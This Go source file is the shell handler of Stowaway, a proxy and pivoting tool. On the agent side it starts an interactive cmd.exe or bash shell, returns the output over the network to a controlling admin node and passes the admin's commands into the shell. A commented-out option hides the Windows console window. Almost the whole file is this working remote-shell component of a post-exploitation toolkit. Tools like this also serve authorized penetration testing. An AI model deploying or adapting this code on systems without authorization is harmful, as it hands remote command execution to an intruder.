/*
 * @Author: ph4ntom
 * @Date: 2021-03-17 18:38:28
 * @LastEditors: ph4ntom
 * @LastEditTime: 2021-03-19 16:55:10
 */
package handler

import (
	"Stowaway/protocol"
	"Stowaway/utils"
	"io"
	"net"
	"os/exec"
	"runtime"
)

type Shell struct {
	stdin  io.Writer
	stdout io.Reader
}

func NewShell() *Shell {
	return new(Shell)
}

func (shell *Shell) Init() error {
	var cmd *exec.Cmd
	//判断操作系统后决定启动哪一种shell
	switch utils.CheckSystem() {
	case 0x01:
		cmd = exec.Command("c:\\windows\\system32\\cmd.exe")
		// cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}	// If you don't want the cmd window, remove "//"
	default:
		cmd = exec.Command("/bin/sh", "-i")
		if runtime.GOARCH == "386" || runtime.GOARCH == "amd64" {
			cmd = exec.Command("/bin/bash", "-i")
		}
	}

	shell.stdout, _ = cmd.StdoutPipe()

	shell.stdin, _ = cmd.StdinPipe()

	cmd.Stderr = cmd.Stdout //将stderr重定向至stdout
	err := cmd.Start()

	return err
}

func (shell *Shell) Run(conn net.Conn, nodeID string, secret string) {
	buf := make([]byte, 1024)

	sMessage := protocol.PrepareAndDecideWhichSProto(conn, secret, nodeID)
	header := protocol.Header{
		Sender:      nodeID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.SHELLRESULT,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	var shellResultMess protocol.ShellResult
	shell.stdin.Write([]byte(""))

	for {
		count, err := shell.stdout.Read(buf)

		if err != nil {
			return
		}

		shellResultMess = protocol.ShellResult{
			OK:        1,
			ResultLen: uint64(count),
			Result:    string(buf[:count]),
		}

		protocol.ConstructMessage(sMessage, header, shellResultMess)
		sMessage.SendMessage()
	}
}

func (shell *Shell) Input(command string) {
	shell.stdin.Write([]byte(command))
}
